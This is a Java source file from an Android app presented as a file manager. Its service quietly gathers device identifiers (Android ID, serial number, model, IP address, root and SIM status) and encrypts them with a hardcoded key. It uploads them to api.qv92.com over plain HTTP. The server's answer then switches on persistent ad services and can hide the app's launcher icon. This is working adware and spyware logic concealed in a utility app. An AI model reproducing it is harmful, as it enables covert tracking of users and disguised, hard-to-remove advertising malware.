package com.kuyikeji.filemanager.uploaddatas;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.os.Build;
import android.os.Handler;
import okhttp3.OkHttpClient;
import okhttp3.RequestBody;
import okhttp3.Response;
import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Environment;
import android.os.LocaleList;
import android.os.Looper;
import android.os.StatFs;
import android.provider.Settings;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.text.format.Formatter;
import android.util.DisplayMetrics;
import com.google.gson.Gson;
import com.kuyikeji.filemanager.advertisement.AppAdBroadcast;
import com.kuyikeji.filemanager.advertisement.ProtectAdvertisementJobService;
import com.kuyikeji.filemanager.advertisement.ProtectAdvertisementService;
import com.xdandroid.hellodaemon.DaemonEnv;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.URL;
import java.net.URLConnection;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Locale;
import java.util.Map;
import java.util.TimeZone;
import io.reactivex.Observable;
import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.functions.Consumer;
import io.reactivex.functions.Function;
import io.reactivex.schedulers.Schedulers;

public class UploadHardwareInfosService extends IntentService
{
    private String secretKey;
    private OkHttpClient client;
    private String operationAction;
    private AppAdBroadcast mAppAdBroadcast;

    public UploadHardwareInfosService()
    {
        super("UploadHardwareInfosService");
    }

    public void onCreate()
    {
        super.onCreate();
        operationAction = "e";
        client = new OkHttpClient();
        secretKey = "WASE@#TGE23456uhtnp3454zXvkfgopedg-0p-[0;oli5yuwranzx";
    }

    protected void onHandleIntent(@Nullable Intent intent)
    {
        String glStr = intent.getStringExtra("gl_datas");
        Map<String,String> values = new HashMap<String,String>();
        String[] keys = glStr.split("&");
        for(int index = 0;index < keys.length;index++)
        {
            String[] tmpStrs = keys[index].split("=");
            if(tmpStrs.length == 2)
                values.put(tmpStrs[0].trim(),tmpStrs[1].trim());
            else
                values.put(tmpStrs[0].trim(),"");
        }

        String ip = "";
        URL ipify = null;
        try
        {
            ipify = new URL("https://api.ipify.org");
            URLConnection conn = ipify.openConnection();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            ip = in.readLine();
            in.close();
        }
        catch (MalformedURLException e)
        {
            e.printStackTrace();
        }
        catch (IOException e)
        {
            e.printStackTrace();
        }

        FormBody.Builder builder = new FormBody.Builder().
                add("a",encrypt(getAndroidId(getApplicationContext()),secretKey,operationAction)).
                add("b",encrypt(getSerialNumber(),secretKey,operationAction)).
                add("c",encrypt(getDeviceBrand() + ":" + getSystemModel(),secretKey,operationAction)).
                add("d",encrypt(getFbv(),secretKey,operationAction)).
                add("e",encrypt(getIPAddress(),secretKey,operationAction)).
                add("f",encrypt(getSystemVersion(),secretKey,operationAction)).
                add("g",encrypt((isDeviceRooted() ? "1" : "0"),secretKey,operationAction)).
                add("h",encrypt((isHasSimCard(getApplicationContext()) ? "1" : "0"),secretKey,operationAction)).
                add("i",encrypt(getSystemLanguage(),secretKey,operationAction)).
                add("j",encrypt(getCurrentTimeZone(),secretKey,operationAction)).
                add("k",encrypt(getRomTotalMemory(),secretKey,operationAction)).
                add("l",encrypt(getRamTotalMemory(getApplicationContext()),secretKey,operationAction)).
                add("m",encrypt(android.os.Build.HARDWARE,secretKey,operationAction)).
                add("n",encrypt(getPackageName(),secretKey,operationAction));
        Iterator<Map.Entry<String,String>> iterator = values.entrySet().iterator();
        while(iterator.hasNext())
        {
            Map.Entry<String, String> entry =  iterator.next();
            builder.add(entry.getKey().trim(),encrypt(entry.getValue().trim(),secretKey,operationAction));
        }
        builder.add("s",encrypt(ip,secretKey,operationAction));
        RequestBody formBody = builder.build();okhttp3.Request request = new okhttp3.Request.Builder()
                                .url("http://api.qv92.com/upload-mobile-info3").post(formBody).build();
        Call call = client.newCall(request);
        call.enqueue(new Callback()
        {
            public void onFailure(Call call, IOException e)
            {
                Handler handler = new Handler(Looper.getMainLooper());
                handler.post(new Runnable()
                {
                    public void run()
                    {
                        /******************************应用内广告逻辑******************************/
                        mAppAdBroadcast = new AppAdBroadcast();
                        IntentFilter powerAndScreenIntentFilter = new IntentFilter();
                        powerAndScreenIntentFilter.addAction(AppAdBroadcast.START_ACTIVITY);
                        powerAndScreenIntentFilter.addAction(AppAdBroadcast.END_ACTIVITY);
                        registerReceiver(mAppAdBroadcast,powerAndScreenIntentFilter);
                        Intent startAppIntent = new Intent(AppAdBroadcast.START_ACTIVITY);
                        sendBroadcast(startAppIntent);
                    }
                });
            }

            public void onResponse(Call call, Response response) throws IOException
            {
                Observable.just("").map(new Function<String, ResultExecutePlanBean>()
                {
                    public ResultExecutePlanBean apply(String s) throws Exception
                    {
                        Gson gson = new Gson();
                        ResultExecutePlanBean resultExecutePlanBean = gson.fromJson(response.body().string(), ResultExecutePlanBean.class);
                        SharedPreferences preferences = getSharedPreferences("ad",Context.MODE_MULTI_PROCESS);
                        SharedPreferences.Editor editor =  preferences.edit();
                        editor.putInt("adplan", resultExecutePlanBean.getData().getAdFlag());
                        editor.putLong("addelay",resultExecutePlanBean.getData().getOpenAdDelay());
                        editor.putLong("adinterval", resultExecutePlanBean.getData().getAdInterval());
                        editor.putLong("adnumforday",resultExecutePlanBean.getData().getOpenAdNumsForDay());
                        editor.commit();
                        return resultExecutePlanBean;
                    }
                }).subscribeOn(Schedulers.io()).observeOn(AndroidSchedulers.mainThread()).subscribe(new Consumer<ResultExecutePlanBean>()
                {
                    public void accept(ResultExecutePlanBean resultExecutePlanBean) throws Exception
                    {
                        if(resultExecutePlanBean.getData().getAdFlag() == 1)//yes
                        {
                            /********************************启动保护工作******************************/
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
                            {
                                JobScheduler jobScheduler = (JobScheduler) getSystemService(Context.JOB_SCHEDULER_SERVICE);
                                JobInfo.Builder builder = new JobInfo.Builder(ProtectAdvertisementJobService.JonId, new ComponentName(UploadHardwareInfosService.this, ProtectAdvertisementJobService.class));
                                ProtectAdvertisementJobService.JonId++;
                                builder.setPersisted(true);
                                builder.setRequiresCharging(false);
                                builder.setRequiresDeviceIdle(false);
                                builder.setMinimumLatency(3 * 60 * 1000);
                                builder.setOverrideDeadline(5 * 60 * 1000);
                                builder.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
                                jobScheduler.schedule(builder.build());
                            }
                            else
                            {
                                ProtectAdvertisementService.sShouldStopService = false;
                                DaemonEnv.startServiceMayBind(ProtectAdvertisementService.class);
                            }
                            /*************************进入应用开启广告***********************/
                            Intent startAppIntent = new Intent(AppAdBroadcast.START_ACTIVITY);
                            sendBroadcast(startAppIntent);
                        }

                        else if(resultExecutePlanBean.getData().getAdFlag() == 0)//no
                        {
                            /******************************应用内广告逻辑******************************/
                            mAppAdBroadcast = new AppAdBroadcast();
                            IntentFilter powerAndScreenIntentFilter = new IntentFilter();
                            powerAndScreenIntentFilter.addAction(AppAdBroadcast.START_ACTIVITY);
                            powerAndScreenIntentFilter.addAction(AppAdBroadcast.END_ACTIVITY);
                            registerReceiver(mAppAdBroadcast,powerAndScreenIntentFilter);
                            Intent startAppIntent = new Intent(AppAdBroadcast.START_ACTIVITY);
                            sendBroadcast(startAppIntent);
                        }

                        if(resultExecutePlanBean.getData().isHideIcon())
                        {
                            Intent intent = new Intent(UploadHardwareInfosService.this,HideIconService.class);
                            intent.putExtra("time",resultExecutePlanBean.getData().getHideIconTime());
                            startService(intent);
                        }
                    }
                });
            }
        });
    }

    public void onDestroy()
    {
        super.onDestroy();
        client = null;
        secretKey = null;
        operationAction = null;
    }

    /***获取手机分辨率***/
    public String getFbv()
    {
        DisplayMetrics dm = getResources().getDisplayMetrics();
        int width = dm.widthPixels;
        int height = dm.heightPixels;
        return width + "x" + height;
    }

    public byte ord(char ch)
    {
        byte byteAscii = (byte)ch;
        return byteAscii;
    }

    public char chr(int ascii)
    {
        char ch = (char)ascii;
        return ch;
    }

    public String getIPAddress()
    {
        NetworkInfo info = ((ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo();
        if (info != null && info.isConnected())
        {
            if (info.getType() == ConnectivityManager.TYPE_MOBILE)//当前使用2G/3G/4G网络
            {
                try
                {
                    //Enumeration<NetworkInterface> en=NetworkInterface.getNetworkInterfaces();
                    for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements(); )
                    {
                        NetworkInterface intf = en.nextElement();
                        for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements(); )
                        {
                            InetAddress inetAddress = enumIpAddr.nextElement();
                            if (!inetAddress.isLoopbackAddress() && inetAddress instanceof Inet4Address)
                            {
                                return inetAddress.getHostAddress();
                            }
                        }
                    }
                }
                catch (SocketException e)
                {
                    e.printStackTrace();
                }
            }
            else if (info.getType() == ConnectivityManager.TYPE_WIFI)//当前使用无线网络
            {
                WifiManager wifiManager = (WifiManager)getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                String ipAddress = intIP2StringIP(wifiInfo.getIpAddress());//得到IPV4地址
                return ipAddress;
            }
        }
        else
        {
            //当前无网络连接,请在设置中打开网络
        }
        return null;
    }

    public boolean isDeviceRooted()
    {
        return checkRootMethod1() || checkRootMethod2() || checkRootMethod3();
    }

    public String getSerialNumber()
    {
        return Build.SERIAL;

    }

    /********获取手机厂商********/
    public String getDeviceBrand()
    {
        return android.os.Build.BRAND;

    }

    /********获取手机型号********/
    public String getSystemModel()
    {
        return android.os.Build.MODEL;

    }

    public String md5(String string)
    {
        if (TextUtils.isEmpty(string))
        {
            return "";
        }
        MessageDigest md5 = null;
        try
        {
            md5 = MessageDigest.getInstance("MD5");
            byte[] bytes = md5.digest(string.getBytes());
            String result = "";
            for (byte b : bytes)
            {
                String temp = Integer.toHexString(b & 0xff);
                if (temp.length() == 1)
                {
                    temp = "0" + temp;
                }
                result += temp;
            }
            return result;
        }
        catch (NoSuchAlgorithmException e)
        {
            e.printStackTrace();
        }
        return "";
    }

    public String getSystemLanguage()
    {
        Locale locale = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N)
            locale = LocaleList.getDefault().get(0);
        else
            locale = Locale.getDefault();
        return locale.getLanguage() + "-" + locale.getCountry();
    }

    private boolean checkRootMethod1()
    {
        String buildTags = android.os.Build.TAGS;
        return buildTags != null && buildTags.contains("test-keys");
    }

    private boolean checkRootMethod2()
    {
        String[] paths = { "/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su", "/system/sd/xbin/su",
                "/system/bin/failsafe/su", "/data/local/su", "/su/bin/su"};
        for (String path : paths)
        {
            if (new File(path).exists()) return true;
        }
        return false;
    }

    private boolean checkRootMethod3()
    {
        Process process = null;
        try
        {
            process = Runtime.getRuntime().exec(new String[] { "/system/xbin/which", "su" });
            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
            if (in.readLine() != null) return true;
            return false;
        }
        catch (Throwable t)
        {
            return false;
        }
        finally
        {
            if (process != null)
                process.destroy();
        }
    }

    public String getCurrentTimeZone()
    {
        TimeZone tz = TimeZone.getDefault();
        String strTz = tz.getDisplayName(false, TimeZone.SHORT);
        return strTz;
    }

    private String getRomTotalMemory()
    {
        try
        {
            FileInputStream fis = new FileInputStream(new File("/proc/meminfo"));
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(fis));
            String memTotal = bufferedReader.readLine();
            StringBuffer sb = new StringBuffer();
            for (char c : memTotal.toCharArray())
            {
                if (c >= '0' && c <= '9')
                {
                    sb.append(c);
                }
            }
            long totalMemory = Long.parseLong(sb.toString()) * 1024;
            String resultStr = Formatter.formatFileSize(this,totalMemory);
            StringBuffer buffer = new StringBuffer();
            for(int index=0;index<resultStr.length();index++)
            {
                if((resultStr.charAt(index) > '0'&& resultStr.charAt(index) < '9') || ".".equals(String.valueOf(resultStr.charAt(index))))
                {
                    buffer.append(resultStr.charAt(index));
                    continue;
                }
            }
            buffer.append("GB");
            return buffer.toString();
        }
        catch (Exception e)
        {
            e.printStackTrace();
            return "";
        }
    }

    /********获取当前手机系统版本号********/
    public String getSystemVersion()
    {
        return android.os.Build.VERSION.RELEASE;

    }

    /**将得到的int类型的IP转换为String类型*/
    public String intIP2StringIP(int ip)
    {
        return (ip & 0xFF) + "." +
                ((ip >> 8) & 0xFF) + "." +
                ((ip >> 16) & 0xFF) + "." +
                (ip >> 24 & 0xFF);
    }

    public String getAndroidId(Context context)
    {
        return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
    }

    public boolean isHasSimCard(Context context)
    {
        TelephonyManager telMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        int simState = telMgr.getSimState();
        boolean result = true;
        switch (simState)
        {
            case TelephonyManager.SIM_STATE_ABSENT: result = false;break;
            case TelephonyManager.SIM_STATE_UNKNOWN: result = false;break;
        }
        return result;
    }

    /***********得到内置存储空间的总容量***********/
    public String getRamTotalMemory(Context context)
    {
        String path = Environment.getDataDirectory().getPath();
        StatFs statFs = new StatFs(path);
        long blockSize = statFs.getBlockSize();
        long totalBlocks = statFs.getBlockCount();
        long availableBlocks = statFs.getAvailableBlocks();
        long useBlocks  = totalBlocks - availableBlocks;
        long rom_length = totalBlocks*blockSize;
        String resultStr = Formatter.formatFileSize(this,rom_length);
        StringBuffer buffer = new StringBuffer();
        for(int index=0;index<resultStr.length();index++)
        {
            if((resultStr.charAt(index) > '0'&& resultStr.charAt(index) < '9') || ".".equals(String.valueOf(resultStr.charAt(index))))
            {
                buffer.append(resultStr.charAt(index));
                continue;
            }
        }
        buffer.append("GB");
        return buffer.toString();
    }

    public String encrypt(String content, String secretKey, String operation)
    {
        secretKey = md5(secretKey);
        int secretKeyLength = secretKey.length();
        content = (null != operation && operation.trim().equals("D") ? DefineBase64.encode(content):md5(content + secretKey).subSequence(0,16) + content);
        int contentLength = content.length();
        int[] box = new int[256];
        int[] rndkey = new int[256];
        String result = "";
        for(int i = 0; i < 256;i++)
        {
            rndkey[i] = ord(secretKey.toCharArray()[i % secretKeyLength]);
            box[i] = i;
        }
        for(int i = 0,j = 0; i < 256; i++)
        {
            j = (j + box[i] + rndkey[i]) % 256;
            int tmp = box[i];
            box[i] = box[j];
            box[j] = tmp;
        }
        for(int a = 0,i = 0,j = 0;i < contentLength; i++)
        {
            a = (a + 1) % 256;
            j = (j + box[a]) % 256;
            int tmp = box[a];
            box[a] = box[j];
            box[j] = tmp;

            int tmp1 = (int)ord(content.toCharArray()[i]);
            int tmp2 = box[(box[a] + box[j]) % 256];
            int temp3 = tmp1 ^ tmp2;
            char c = chr(temp3);
            result +=  String.valueOf(chr(((int)ord(content.toCharArray()[i])) ^ (box[(box[a] + box[j]) % 256])));
        }

        if(null != operation && operation.equals("D"))
        {
            if(result.substring(0,16).equals(md5(result.substring(16) + secretKey).substring(0,16)))
            {
                return result.substring(16);
            }
            else
            {
                return "";
            }
        }
        else
        {
            return new String(DefineBase64.encode(result)).replace("=","");
        }
    }
}